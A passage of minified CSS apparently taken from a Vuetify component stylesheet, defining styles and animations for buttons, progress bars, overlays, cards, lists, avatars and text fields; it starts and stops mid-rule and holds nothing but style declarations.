rgba(0,0,0,.2),0 12px 17px 2px rgba(0,0,0,.14),0 5px 22px 4px rgba(0,0,0,.12)}.v-btn--fab.v-btn--absolute,.v-btn--fab.v-btn--fixed{z-index:4}.v-btn--fab.v-size--x-small{height:32px;width:32px}.v-btn--fab.v-size--x-small.v-btn--absolute.v-btn--bottom{bottom:-16px}.v-btn--fab.v-size--x-small.v-btn--absolute.v-btn--top{top:-16px}.v-btn--fab.v-size--small{height:40px;width:40px}.v-btn--fab.v-size--small.v-btn--absolute.v-btn--bottom{bottom:-20px}.v-btn--fab.v-size--small.v-btn--absolute.v-btn--top{top:-20px}.v-btn--fab.v-size--default{height:56px;width:56px}.v-btn--fab.v-size--default.v-btn--absolute.v-btn--bottom{bottom:-28px}.v-btn--fab.v-size--default.v-btn--absolute.v-btn--top{top:-28px}.v-btn--fab.v-size--large{height:64px;width:64px}.v-btn--fab.v-size--large.v-btn--absolute.v-btn--bottom{bottom:-32px}.v-btn--fab.v-size--large.v-btn--absolute.v-btn--top{top:-32px}.v-btn--fab.v-size--x-large{height:72px;width:72px}.v-btn--fab.v-size--x-large.v-btn--absolute.v-btn--bottom{bottom:-36px}.v-btn--fab.v-size--x-large.v-btn--absolute.v-btn--top{top:-36px}.v-btn--fixed{position:fixed}.v-btn--loading{pointer-events:none;transition:none}.v-btn--loading .v-btn__content{opacity:0}.v-btn--outlined{border:thin solid}.v-btn--outlined .v-btn__content .v-icon,.v-btn--round .v-btn__content .v-icon{color:currentColor}.v-btn--flat,.v-btn--outlined,.v-btn--text{background-color:transparent}.v-btn--outlined:before,.v-btn--round:before,.v-btn--rounded:before{border-radius:inherit}.v-btn--round{border-radius:50%}.v-btn--rounded{border-radius:28px}.v-btn--tile{border-radius:0}
.v-progress-circular{position:relative;display:inline-flex;vertical-align:middle;justify-content:center;align-items:center}.v-progress-circular>svg{width:100%;height:100%;margin:auto;position:absolute;top:0;bottom:0;left:0;right:0;z-index:0}.v-progress-circular--indeterminate>svg{-webkit-animation:progress-circular-rotate 1.4s linear infinite;animation:progress-circular-rotate 1.4s linear infinite;transform-origin:center center;transition:all .2s ease-in-out}.v-progress-circular--indeterminate .v-progress-circular__overlay{-webkit-animation:progress-circular-dash 1.4s ease-in-out infinite;animation:progress-circular-dash 1.4s ease-in-out infinite;stroke-linecap:round;stroke-dasharray:80,200;stroke-dashoffset:0px}.v-progress-circular__info{align-items:center;display:flex;justify-content:center}.v-progress-circular__underlay{stroke:rgba(0,0,0,.1);z-index:1}.v-progress-circular__overlay{stroke:currentColor;z-index:2;transition:all .6s ease-in-out}@-webkit-keyframes progress-circular-dash{0%{stroke-dasharray:1,200;stroke-dashoffset:0px}50%{stroke-dasharray:100,200;stroke-dashoffset:-15px}to{stroke-dasharray:100,200;stroke-dashoffset:-125px}}@keyframes progress-circular-dash{0%{stroke-dasharray:1,200;stroke-dashoffset:0px}50%{stroke-dasharray:100,200;stroke-dashoffset:-15px}to{stroke-dasharray:100,200;stroke-dashoffset:-125px}}@-webkit-keyframes progress-circular-rotate{to{transform:rotate(1turn)}}@keyframes progress-circular-rotate{to{transform:rotate(1turn)}}
.theme--light.v-overlay{color:rgba(0,0,0,.87)}.theme--dark.v-overlay{color:#fff}.v-overlay{align-items:center;border-radius:inherit;display:flex;justify-content:center;position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;transition:.3s cubic-bezier(.25,.8,.5,1),z-index 1ms}.v-overlay__content{position:relative}.v-overlay__scrim{border-radius:inherit;bottom:0;height:100%;left:0;position:absolute;right:0;top:0;transition:inherit;width:100%;will-change:opacity}.v-overlay--absolute{position:absolute}.v-overlay--active{pointer-events:auto}
.theme--light.v-card{background-color:#fff;color:rgba(0,0,0,.87)}.theme--light.v-card .v-card__subtitle,.theme--light.v-card>.v-card__text{color:rgba(0,0,0,.6)}.theme--dark.v-card{background-color:#1e1e1e;color:#fff}.theme--dark.v-card .v-card__subtitle,.theme--dark.v-card>.v-card__text{color:hsla(0,0%,100%,.7)}.v-sheet.v-card{border-radius:4px}.v-sheet.v-card:not(.v-sheet--outlined){box-shadow:0 3px 1px -2px rgba(0,0,0,.2),0 2px 2px 0 rgba(0,0,0,.14),0 1px 5px 0 rgba(0,0,0,.12)}.v-sheet.v-card.v-sheet--shaped{border-radius:24px 4px}.v-card{border-width:thin;display:block;max-width:100%;outline:none;text-decoration:none;transition-property:box-shadow,opacity;word-wrap:break-word;position:relative;white-space:normal}.v-card>.v-card__progress+:not(.v-btn):not(.v-chip),.v-card>:first-child:not(.v-btn):not(.v-chip){border-top-left-radius:inherit;border-top-right-radius:inherit}.v-card>:last-child:not(.v-btn):not(.v-chip){border-bottom-left-radius:inherit;border-bottom-right-radius:inherit}.v-card__progress{top:0;left:0;right:0;overflow:hidden}.v-card__subtitle+.v-card__text{padding-top:0}.v-card__subtitle,.v-card__text{font-size:.875rem;font-weight:400;line-height:1.375rem;letter-spacing:.0071428571em}.v-card__subtitle,.v-card__text,.v-card__title{padding:16px}.v-card__title{align-items:center;display:flex;flex-wrap:wrap;font-size:1.25rem;font-weight:500;letter-spacing:.0125em;line-height:2rem;word-break:break-all}.v-card__title+.v-card__subtitle,.v-card__title+.v-card__text{padding-top:0}.v-card__title+.v-card__subtitle{margin-top:-16px}.v-card__text{width:100%}.v-card__actions{align-items:center;display:flex;padding:8px}.v-card__actions>.v-btn.v-btn{padding:0 8px}.v-application--is-ltr .v-card__actions>.v-btn.v-btn+.v-btn{margin-left:8px}.v-application--is-ltr .v-card__actions>.v-btn.v-btn .v-icon--left{margin-left:4px}.v-application--is-ltr .v-card__actions>.v-btn.v-btn .v-icon--right{margin-right:4px}.v-application--is-rtl .v-card__actions>.v-btn.v-btn+.v-btn{margin-right:8px}.v-application--is-rtl .v-card__actions>.v-btn.v-btn .v-icon--left{margin-right:4px}.v-application--is-rtl .v-card__actions>.v-btn.v-btn .v-icon--right{margin-left:4px}.v-card--flat{box-shadow:0 0 0 0 rgba(0,0,0,.2),0 0 0 0 rgba(0,0,0,.14),0 0 0 0 rgba(0,0,0,.12)!important}.v-card--hover{cursor:pointer;transition:box-shadow .4s cubic-bezier(.25,.8,.25,1)}.v-card--hover:focus,.v-card--hover:hover{box-shadow:0 5px 5px -3px rgba(0,0,0,.2),0 8px 10px 1px rgba(0,0,0,.14),0 3px 14px 2px rgba(0,0,0,.12)}.v-card--link,.v-card--link .v-chip{cursor:pointer}.v-card--link:focus:before{opacity:.08}.v-card--link:before{background:currentColor;bottom:0;content:"";left:0;opacity:0;pointer-events:none;position:absolute;right:0;top:0;transition:opacity .2s}.v-card--disabled{pointer-events:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.v-card--disabled>:not(.v-card__progress){opacity:.6;transition:inherit}.v-card--loading{overflow:hidden}.v-card--raised{box-shadow:0 5px 5px -3px rgba(0,0,0,.2),0 8px 10px 1px rgba(0,0,0,.14),0 3px 14px 2px rgba(0,0,0,.12)}
.theme--light.v-progress-linear{color:rgba(0,0,0,.87)}.theme--dark.v-progress-linear{color:#fff}.v-progress-linear{background:transparent;overflow:hidden;position:relative;transition:.2s cubic-bezier(.4,0,.6,1);width:100%}.v-progress-linear__buffer{height:inherit;left:0;position:absolute;top:0;transition:inherit;width:100%;z-index:1}.v-progress-linear--reverse .v-progress-linear__buffer{left:auto;right:0}.v-progress-linear__background{bottom:0;left:0;position:absolute;top:0;transition:inherit}.v-progress-linear--reverse .v-progress-linear__background{left:auto;right:0}.v-progress-linear__content{align-items:center;display:flex;height:100%;left:0;justify-content:center;position:absolute;top:0;width:100%;z-index:2}.v-progress-linear--reverse .v-progress-linear__content{left:auto;right:0}.v-progress-linear__determinate{height:inherit;left:0;position:absolute;transition:inherit}.v-progress-linear--reverse .v-progress-linear__determinate{left:auto;right:0}.v-progress-linear .v-progress-linear__indeterminate .long,.v-progress-linear .v-progress-linear__indeterminate .short{background-color:inherit;bottom:0;height:inherit;left:0;position:absolute;right:auto;top:0;width:auto;will-change:left,right}.v-progress-linear .v-progress-linear__indeterminate--active .long{-webkit-animation-name:indeterminate-ltr;animation-name:indeterminate-ltr;-webkit-animation-duration:2.2s;animation-duration:2.2s;-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite}.v-progress-linear .v-progress-linear__indeterminate--active .short{-webkit-animation-name:indeterminate-short-ltr;animation-name:indeterminate-short-ltr;-webkit-animation-duration:2.2s;animation-duration:2.2s;-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite}.v-progress-linear--reverse .v-progress-linear__indeterminate .long,.v-progress-linear--reverse .v-progress-linear__indeterminate .short{left:auto;right:0}.v-progress-linear--reverse .v-progress-linear__indeterminate--active .long{-webkit-animation-name:indeterminate-rtl;animation-name:indeterminate-rtl}.v-progress-linear--reverse .v-progress-linear__indeterminate--active .short{-webkit-animation-name:indeterminate-short-rtl;animation-name:indeterminate-short-rtl}.v-progress-linear__stream{-webkit-animation:stream-ltr .25s linear infinite;animation:stream-ltr .25s linear infinite;border-color:currentColor;border-top:4px dotted;bottom:0;left:auto;right:-8px;opacity:.3;pointer-events:none;position:absolute;top:calc(50% - 2px);transition:inherit}.v-progress-linear--reverse .v-progress-linear__stream{-webkit-animation:stream-rtl .25s linear infinite;animation:stream-rtl .25s linear infinite;left:-8px;right:auto}.v-progress-linear__wrapper{overflow:hidden;position:relative;transition:inherit}.v-progress-linear--absolute,.v-progress-linear--fixed{left:0;z-index:1}.v-progress-linear--absolute{position:absolute}.v-progress-linear--fixed{position:fixed}.v-progress-linear--reactive .v-progress-linear__content{pointer-events:none}.v-progress-linear--rounded{border-radius:4px}.v-progress-linear--striped .v-progress-linear__determinate{background-image:linear-gradient(135deg,hsla(0,0%,100%,.25) 25%,transparent 0,transparent 50%,hsla(0,0%,100%,.25) 0,hsla(0,0%,100%,.25) 75%,transparent 0,transparent);background-size:40px 40px;background-repeat:repeat}.v-progress-linear--query .v-progress-linear__indeterminate--active .long{-webkit-animation-name:query-ltr;animation-name:query-ltr;-webkit-animation-duration:2s;animation-duration:2s;-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite}.v-progress-linear--query .v-progress-linear__indeterminate--active .short{-webkit-animation-name:query-short-ltr;animation-name:query-short-ltr;-webkit-animation-duration:2s;animation-duration:2s;-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite}.v-progress-linear--query.v-progress-linear--reverse .v-progress-linear__indeterminate--active .long{-webkit-animation-name:query-rtl;animation-name:query-rtl}.v-progress-linear--query.v-progress-linear--reverse .v-progress-linear__indeterminate--active .short{-webkit-animation-name:query-short-rtl;animation-name:query-short-rtl}@-webkit-keyframes indeterminate-ltr{0%{left:-90%;right:100%}60%{left:-90%;right:100%}to{left:100%;right:-35%}}@keyframes indeterminate-ltr{0%{left:-90%;right:100%}60%{left:-90%;right:100%}to{left:100%;right:-35%}}@-webkit-keyframes indeterminate-rtl{0%{left:100%;right:-90%}60%{left:100%;right:-90%}to{left:-35%;right:100%}}@keyframes indeterminate-rtl{0%{left:100%;right:-90%}60%{left:100%;right:-90%}to{left:-35%;right:100%}}@-webkit-keyframes indeterminate-short-ltr{0%{left:-200%;right:100%}60%{left:107%;right:-8%}to{left:107%;right:-8%}}@keyframes indeterminate-short-ltr{0%{left:-200%;right:100%}60%{left:107%;right:-8%}to{left:107%;right:-8%}}@-webkit-keyframes indeterminate-short-rtl{0%{left:100%;right:-200%}60%{left:-8%;right:107%}to{left:-8%;right:107%}}@keyframes indeterminate-short-rtl{0%{left:100%;right:-200%}60%{left:-8%;right:107%}to{left:-8%;right:107%}}@-webkit-keyframes query-ltr{0%{right:-90%;left:100%}60%{right:-90%;left:100%}to{right:100%;left:-35%}}@keyframes query-ltr{0%{right:-90%;left:100%}60%{right:-90%;left:100%}to{right:100%;left:-35%}}@-webkit-keyframes query-rtl{0%{right:100%;left:-90%}60%{right:100%;left:-90%}to{right:-35%;left:100%}}@keyframes query-rtl{0%{right:100%;left:-90%}60%{right:100%;left:-90%}to{right:-35%;left:100%}}@-webkit-keyframes query-short-ltr{0%{right:-200%;left:100%}60%{right:107%;left:-8%}to{right:107%;left:-8%}}@keyframes query-short-ltr{0%{right:-200%;left:100%}60%{right:107%;left:-8%}to{right:107%;left:-8%}}@-webkit-keyframes query-short-rtl{0%{right:100%;left:-200%}60%{right:-8%;left:107%}to{right:-8%;left:107%}}@keyframes query-short-rtl{0%{right:100%;left:-200%}60%{right:-8%;left:107%}to{right:-8%;left:107%}}@-webkit-keyframes stream-ltr{to{transform:translateX(-8px)}}@keyframes stream-ltr{to{transform:translateX(-8px)}}@-webkit-keyframes stream-rtl{to{transform:translateX(8px)}}@keyframes stream-rtl{to{transform:translateX(8px)}}
.theme--light.v-divider{border-color:rgba(0,0,0,.12)}.theme--dark.v-divider{border-color:hsla(0,0%,100%,.12)}.v-divider{display:block;flex:1 1 0px;max-width:100%;height:0;max-height:0;border:solid;border-width:thin 0 0;transition:inherit}.v-divider--inset:not(.v-divider--vertical){max-width:calc(100% - 72px)}.v-application--is-ltr .v-divider--inset:not(.v-divider--vertical){margin-left:72px}.v-application--is-rtl .v-divider--inset:not(.v-divider--vertical){margin-right:72px}.v-divider--vertical{align-self:stretch;border:solid;border-width:0 thin 0 0;display:inline-flex;height:inherit;min-height:100%;max-height:100%;max-width:0;width:0;vertical-align:text-bottom}.v-divider--vertical.v-divider--inset{margin-top:8px;min-height:0;max-height:calc(100% - 16px)}
.theme--light.v-list-item--disabled{color:rgba(0,0,0,.38)}.theme--light.v-list-item:not(.v-list-item--active):not(.v-list-item--disabled){color:rgba(0,0,0,.87)!important}.theme--light.v-list-item .v-list-item__mask{color:rgba(0,0,0,.38);background:#eee}.theme--light.v-list-item .v-list-item__action-text,.theme--light.v-list-item .v-list-item__subtitle{color:rgba(0,0,0,.6)}.theme--light.v-list-item:hover:before{opacity:.04}.theme--light.v-list-item--active:before,.theme--light.v-list-item--active:hover:before,.theme--light.v-list-item:focus:before{opacity:.12}.theme--light.v-list-item--active:focus:before,.theme--light.v-list-item.v-list-item--highlighted:before{opacity:.16}.theme--dark.v-list-item--disabled{color:hsla(0,0%,100%,.5)}.theme--dark.v-list-item:not(.v-list-item--active):not(.v-list-item--disabled){color:#fff!important}.theme--dark.v-list-item .v-list-item__mask{color:hsla(0,0%,100%,.5);background:#494949}.theme--dark.v-list-item .v-list-item__action-text,.theme--dark.v-list-item .v-list-item__subtitle{color:hsla(0,0%,100%,.7)}.theme--dark.v-list-item:hover:before{opacity:.08}.theme--dark.v-list-item--active:before,.theme--dark.v-list-item--active:hover:before,.theme--dark.v-list-item:focus:before{opacity:.24}.theme--dark.v-list-item--active:focus:before,.theme--dark.v-list-item.v-list-item--highlighted:before{opacity:.32}.v-list-item{align-items:center;display:flex;flex:1 1 100%;letter-spacing:normal;min-height:48px;outline:none;padding:0 16px;position:relative;text-decoration:none}.v-list-item--disabled{pointer-events:none}.v-list-item--selectable{-webkit-user-select:auto;-moz-user-select:auto;-ms-user-select:auto;user-select:auto}.v-list-item:after{content:"";min-height:inherit;font-size:0}.v-list-item__action{align-self:center;margin:12px 0}.v-list-item__action .v-input,.v-list-item__action .v-input--selection-controls__input,.v-list-item__action .v-input__control,.v-list-item__action .v-input__slot{margin:0!important}.v-list-item__action .v-input{padding:0}.v-list-item__action .v-input .v-messages{display:none}.v-list-item__action-text{font-size:.75rem}.v-list-item__avatar{align-self:center;justify-content:flex-start}.v-list-item__avatar,.v-list-item__avatar.v-list-item__avatar--horizontal{margin-bottom:8px;margin-top:8px}.v-application--is-ltr .v-list-item__avatar.v-list-item__avatar--horizontal:first-child{margin-left:-16px}.v-application--is-rtl .v-list-item__avatar.v-list-item__avatar--horizontal:first-child{margin-right:-16px}.v-application--is-ltr .v-list-item__avatar.v-list-item__avatar--horizontal:last-child{margin-left:-16px}.v-application--is-rtl .v-list-item__avatar.v-list-item__avatar--horizontal:last-child{margin-right:-16px}.v-list-item__content{align-items:center;align-self:center;display:flex;flex-wrap:wrap;flex:1 1;overflow:hidden;padding:12px 0}.v-list-item__content>*{line-height:1.1;flex:1 0 100%}.v-list-item__content>:not(:last-child){margin-bottom:2px}.v-list-item__icon{align-self:flex-start;margin:16px 0}.v-application--is-ltr .v-list-item__action:last-of-type:not(:only-child),.v-application--is-ltr .v-list-item__avatar:last-of-type:not(:only-child),.v-application--is-ltr .v-list-item__icon:last-of-type:not(:only-child){margin-left:16px}.v-application--is-ltr .v-list-item__avatar:first-child,.v-application--is-rtl .v-list-item__action:last-of-type:not(:only-child),.v-application--is-rtl .v-list-item__avatar:last-of-type:not(:only-child),.v-application--is-rtl .v-list-item__icon:last-of-type:not(:only-child){margin-right:16px}.v-application--is-rtl .v-list-item__avatar:first-child{margin-left:16px}.v-application--is-ltr .v-list-item__action:first-child,.v-application--is-ltr .v-list-item__icon:first-child{margin-right:32px}.v-application--is-rtl .v-list-item__action:first-child,.v-application--is-rtl .v-list-item__icon:first-child{margin-left:32px}.v-list-item__action,.v-list-item__avatar,.v-list-item__icon{display:inline-flex;min-width:24px}.v-list-item .v-list-item__subtitle,.v-list-item .v-list-item__title{line-height:1.2}.v-list-item__subtitle,.v-list-item__title{flex:1 1 100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.v-list-item__title{align-self:center;font-size:1rem}.v-list-item__title>.v-badge{margin-top:16px}.v-list-item__subtitle{font-size:.875rem}.v-list--dense .v-list-item,.v-list-item--dense{min-height:40px}.v-list--dense .v-list-item .v-list-item__icon,.v-list-item--dense .v-list-item__icon{height:24px;margin-top:8px;margin-bottom:8px}.v-list--dense .v-list-item .v-list-item__content,.v-list-item--dense .v-list-item__content{padding:8px 0}.v-list--dense .v-list-item .v-list-item__subtitle,.v-list--dense .v-list-item .v-list-item__title,.v-list-item--dense .v-list-item__subtitle,.v-list-item--dense .v-list-item__title{font-size:.8125rem;font-weight:500;line-height:1rem}.v-list--dense .v-list-item.v-list-item--two-line,.v-list-item--dense.v-list-item--two-line{min-height:60px}.v-list--dense .v-list-item.v-list-item--three-line,.v-list-item--dense.v-list-item--three-line{min-height:76px}.v-list-item--link{cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.v-list-item--link:before{background-color:currentColor;bottom:0;content:"";left:0;opacity:0;pointer-events:none;position:absolute;right:0;top:0;transition:.3s cubic-bezier(.25,.8,.5,1)}.v-list .v-list-item--active,.v-list .v-list-item--active .v-icon{color:inherit}.v-list-item__action--stack{align-items:flex-end;align-self:stretch;justify-content:space-between;white-space:nowrap;flex-direction:column}.v-list--three-line .v-list-item .v-list-item__avatar:not(.v-list-item__avatar--horizontal),.v-list--three-line .v-list-item .v-list-item__icon,.v-list--two-line .v-list-item .v-list-item__avatar:not(.v-list-item__avatar--horizontal),.v-list--two-line .v-list-item .v-list-item__icon,.v-list-item--three-line .v-list-item__avatar:not(.v-list-item__avatar--horizontal),.v-list-item--three-line .v-list-item__icon,.v-list-item--two-line .v-list-item__avatar:not(.v-list-item__avatar--horizontal),.v-list-item--two-line .v-list-item__icon{margin-bottom:16px;margin-top:16px}.v-list--two-line .v-list-item,.v-list-item--two-line{min-height:64px}.v-list--two-line .v-list-item .v-list-item__icon,.v-list-item--two-line .v-list-item__icon{margin-bottom:32px}.v-list--three-line .v-list-item,.v-list-item--three-line{min-height:88px}.v-list--three-line .v-list-item .v-list-item__action,.v-list--three-line .v-list-item .v-list-item__avatar,.v-list-item--three-line .v-list-item__action,.v-list-item--three-line .v-list-item__avatar{align-self:flex-start;margin-top:16px;margin-bottom:16px}.v-list--three-line .v-list-item .v-list-item__content,.v-list-item--three-line .v-list-item__content{align-self:stretch}.v-list--three-line .v-list-item .v-list-item__subtitle,.v-list-item--three-line .v-list-item__subtitle{white-space:normal;-webkit-line-clamp:2;-webkit-box-orient:vertical;display:-webkit-box}
.v-list.accent>.v-list-item,.v-list.error>.v-list-item,.v-list.info>.v-list-item,.v-list.primary>.v-list-item,.v-list.secondary>.v-list-item,.v-list.success>.v-list-item,.v-list.warning>.v-list-item{color:#fff}.theme--light.v-list{background:#fff;color:rgba(0,0,0,.87)}.theme--light.v-list .v-list--disabled{color:rgba(0,0,0,.38)}.theme--light.v-list .v-list-group--active:after,.theme--light.v-list .v-list-group--active:before{background:rgba(0,0,0,.12)}.theme--dark.v-list{background:#1e1e1e;color:#fff}.theme--dark.v-list .v-list--disabled{color:hsla(0,0%,100%,.5)}.theme--dark.v-list .v-list-group--active:after,.theme--dark.v-list .v-list-group--active:before{background:hsla(0,0%,100%,.12)}.v-sheet.v-list{border-radius:0}.v-sheet.v-list:not(.v-sheet--outlined){box-shadow:0 0 0 0 rgba(0,0,0,.2),0 0 0 0 rgba(0,0,0,.14),0 0 0 0 rgba(0,0,0,.12)}.v-sheet.v-list.v-sheet--shaped{border-radius:0}.v-list{display:block;padding:8px 0;position:static;transition:box-shadow .28s cubic-bezier(.4,0,.2,1);will-change:box-shadow}.v-list--disabled{pointer-events:none}.v-list--flat .v-list-item:before{display:none}.v-list--dense .v-subheader{font-size:.75rem;height:40px;padding:0 8px}.v-list--nav .v-list-item:not(:last-child):not(:only-child),.v-list--rounded .v-list-item:not(:last-child):not(:only-child){margin-bottom:8px}.v-list--nav.v-list--dense .v-list-item:not(:last-child):not(:only-child),.v-list--nav .v-list-item--dense:not(:last-child):not(:only-child),.v-list--rounded.v-list--dense .v-list-item:not(:last-child):not(:only-child),.v-list--rounded .v-list-item--dense:not(:last-child):not(:only-child){margin-bottom:4px}.v-list--nav{padding-left:8px;padding-right:8px}.v-list--nav .v-list-item{padding:0 8px}.v-list--nav .v-list-item,.v-list--nav .v-list-item:before{border-radius:4px}.v-application--is-ltr .v-list.v-sheet--shaped .v-list-item,.v-application--is-ltr .v-list.v-sheet--shaped .v-list-item:before,.v-application--is-ltr .v-list.v-sheet--shaped .v-list-item>.v-ripple__container{border-bottom-right-radius:32px!important;border-top-right-radius:32px!important}.v-application--is-rtl .v-list.v-sheet--shaped .v-list-item,.v-application--is-rtl .v-list.v-sheet--shaped .v-list-item:before,.v-application--is-rtl .v-list.v-sheet--shaped .v-list-item>.v-ripple__container{border-bottom-left-radius:32px!important;border-top-left-radius:32px!important}.v-application--is-ltr .v-list.v-sheet--shaped.v-list--two-line .v-list-item,.v-application--is-ltr .v-list.v-sheet--shaped.v-list--two-line .v-list-item:before,.v-application--is-ltr .v-list.v-sheet--shaped.v-list--two-line .v-list-item>.v-ripple__container{border-bottom-right-radius:42.6666666667px!important;border-top-right-radius:42.6666666667px!important}.v-application--is-rtl .v-list.v-sheet--shaped.v-list--two-line .v-list-item,.v-application--is-rtl .v-list.v-sheet--shaped.v-list--two-line .v-list-item:before,.v-application--is-rtl .v-list.v-sheet--shaped.v-list--two-line .v-list-item>.v-ripple__container{border-bottom-left-radius:42.6666666667px!important;border-top-left-radius:42.6666666667px!important}.v-application--is-ltr .v-list.v-sheet--shaped.v-list--three-line .v-list-item,.v-application--is-ltr .v-list.v-sheet--shaped.v-list--three-line .v-list-item:before,.v-application--is-ltr .v-list.v-sheet--shaped.v-list--three-line .v-list-item>.v-ripple__container{border-bottom-right-radius:58.6666666667px!important;border-top-right-radius:58.6666666667px!important}.v-application--is-rtl .v-list.v-sheet--shaped.v-list--three-line .v-list-item,.v-application--is-rtl .v-list.v-sheet--shaped.v-list--three-line .v-list-item:before,.v-application--is-rtl .v-list.v-sheet--shaped.v-list--three-line .v-list-item>.v-ripple__container{border-bottom-left-radius:58.6666666667px!important;border-top-left-radius:58.6666666667px!important}.v-application--is-ltr .v-list.v-sheet--shaped{padding-right:8px}.v-application--is-rtl .v-list.v-sheet--shaped{padding-left:8px}.v-list--rounded{padding:8px}.v-list--rounded .v-list-item,.v-list--rounded .v-list-item:before,.v-list--rounded .v-list-item>.v-ripple__container{border-radius:32px!important}.v-list--rounded.v-list--two-line .v-list-item,.v-list--rounded.v-list--two-line .v-list-item:before,.v-list--rounded.v-list--two-line .v-list-item>.v-ripple__container{border-radius:42.6666666667px!important}.v-list--rounded.v-list--three-line .v-list-item,.v-list--rounded.v-list--three-line .v-list-item:before,.v-list--rounded.v-list--three-line .v-list-item>.v-ripple__container{border-radius:58.6666666667px!important}.v-list--subheader{padding-top:0}
.v-list-group .v-list-group__header .v-list-item__icon.v-list-group__header__append-icon{align-self:center;margin:0;min-width:48px;justify-content:flex-end}.v-list-group--sub-group{align-items:center;display:flex;flex-wrap:wrap}.v-list-group__header.v-list-item--active:not(:hover):not(:focus):before{opacity:0}.v-list-group__items{flex:1 1 auto}.v-list-group__items .v-list-group__items,.v-list-group__items .v-list-item{overflow:hidden}.v-list-group--active>.v-list-group__header.v-list-group__header--sub-group>.v-list-group__header__prepend-icon .v-icon,.v-list-group--active>.v-list-group__header>.v-list-group__header__append-icon .v-icon{transform:rotate(-180deg)}.v-list-group--active>.v-list-group__header .v-list-group__header__prepend-icon .v-icon,.v-list-group--active>.v-list-group__header .v-list-item,.v-list-group--active>.v-list-group__header .v-list-item__content{color:inherit}.v-application--is-ltr .v-list-group--sub-group .v-list-item__action:first-child,.v-application--is-ltr .v-list-group--sub-group .v-list-item__avatar:first-child,.v-application--is-ltr .v-list-group--sub-group .v-list-item__icon:first-child{margin-right:16px}.v-application--is-rtl .v-list-group--sub-group .v-list-item__action:first-child,.v-application--is-rtl .v-list-group--sub-group .v-list-item__avatar:first-child,.v-application--is-rtl .v-list-group--sub-group .v-list-item__icon:first-child{margin-left:16px}.v-application--is-ltr .v-list-group--sub-group .v-list-group__header{padding-left:32px}.v-application--is-rtl .v-list-group--sub-group .v-list-group__header{padding-right:32px}.v-application--is-ltr .v-list-group--sub-group .v-list-group__items .v-list-item{padding-left:40px}.v-application--is-rtl .v-list-group--sub-group .v-list-group__items .v-list-item{padding-right:40px}.v-list-group--sub-group.v-list-group--active .v-list-item__icon.v-list-group__header__prepend-icon .v-icon{transform:rotate(-180deg)}.v-application--is-ltr .v-list-group--no-action>.v-list-group__items>.v-list-item{padding-left:72px}.v-application--is-rtl .v-list-group--no-action>.v-list-group__items>.v-list-item{padding-right:72px}.v-application--is-ltr .v-list-group--no-action.v-list-group--sub-group>.v-list-group__items>.v-list-item{padding-left:88px}.v-application--is-rtl .v-list-group--no-action.v-list-group--sub-group>.v-list-group__items>.v-list-item{padding-right:88px}.v-application--is-ltr .v-list--dense .v-list-group--sub-group .v-list-group__header{padding-left:24px}.v-application--is-rtl .v-list--dense .v-list-group--sub-group .v-list-group__header{padding-right:24px}.v-application--is-ltr .v-list--dense.v-list--nav .v-list-group--no-action>.v-list-group__items>.v-list-item{padding-left:64px}.v-application--is-rtl .v-list--dense.v-list--nav .v-list-group--no-action>.v-list-group__items>.v-list-item{padding-right:64px}.v-application--is-ltr .v-list--dense.v-list--nav .v-list-group--no-action.v-list-group--sub-group>.v-list-group__items>.v-list-item{padding-left:80px}.v-application--is-rtl .v-list--dense.v-list--nav .v-list-group--no-action.v-list-group--sub-group>.v-list-group__items>.v-list-item{padding-right:80px}
.v-list-item-group .v-list-item--active{color:inherit}
.v-item-group{flex:0 1 auto;position:relative;max-width:100%;transition:.3s cubic-bezier(.25,.8,.5,1)}
.v-avatar{align-items:center;border-radius:50%;display:inline-flex;justify-content:center;line-height:normal;position:relative;text-align:center;vertical-align:middle;overflow:hidden}.v-avatar .v-icon,.v-avatar .v-image,.v-avatar .v-responsive__content,.v-avatar img,.v-avatar svg{border-radius:inherit;display:inline-flex;height:inherit;width:inherit}
.theme--light.v-text-field>.v-input__control>.v-input__slot:before{border-color:rgba(0,0,0,.42)}.theme--light.v-text-field:not(.v-input--has-state):hover>.v-input__control>.v-input__slot:before{border-color:rgba(0,0,0,.87)}.theme--light.v-text-field.v-input--is-disabled .v-input__slot:before{-o-border-image:repeating-linear-gradient(90deg,rgba(0,0,0,.38) 0,rgba(0,0,0,.38) 2px,transparent 0,transparent 4px) 1 repeat;border-image:repeating-linear-gradient(90deg,rgba(0,0,0,.38) 0,rgba(0,0,0,.38) 2px,transparent 0,transparent 4px) 1 repeat}.theme--light.v-text-field--filled>.v-input__control>.v-input__slot{background:rgba(0,0,0,.06)}.theme--light.v-text-field--filled:not(.v-input--is-focused):not(.v-input--has-state)>.v-input__control>.v-input__slot:hover{background:rgba(0,0,0,.12)}.theme--light.v-text-field--solo>.v-input__control>.v-input__slot{background:#fff}.theme--light.v-text-field--solo-inverted>.v-input__control>.v-input__slot{background:rgba(0,0,0,.06)}.theme--light.v-text-field--solo-inverted.v-input--is-focused>.v-input__control>.v-input__slot{background:#424242}.theme--light.v-text-field--solo-inverted.v-input--is-focused>.v-input__control>.v-input__slot input{color:#fff}.theme--light.v-text-field--solo-inverted.v-input--is-focused>.v-input__control>.v-input__slot input::-moz-placeholder{color:hsla(0,0%,100%,.5)}.theme--light.v-text-field--solo-inverted.v-input--is-focused>.v-input__control>.v-input__slot input:-ms-input-placeholder{color:hsla(0,0%,100%,.5)}.theme--light.v-text-field--solo-inverted.v-input--is-focused>.v-input__control>.v-input__slot input::placeholder{color:hsla(0,0%,100%,.5)}.theme--light.v-text-field--solo-inverted.v-input--is-focused>.v-input__control>.v-input__slot .v-label{color:hsla(0,0%,100%,.7)}.theme--light.v-text-field--outlined:not(.v-input--is-focused):not(.v-input--has-state)>.v-input__control>.v-input__slot fieldset{color:rgba(0,0,0,.38)}.theme--light.v-text-field--outlined:not(.v-input--is-focused):not(.v-input--has-state):not(.v-input--is-disabled)>.v-input__control>.v-input__slot:hover fieldset{color:rgba(0,0,0,.86)}.theme--light.v-text-field--outlined:not(.v-input--is-focused).v-input--is-disabled>.v-input__control>.v-input__slot 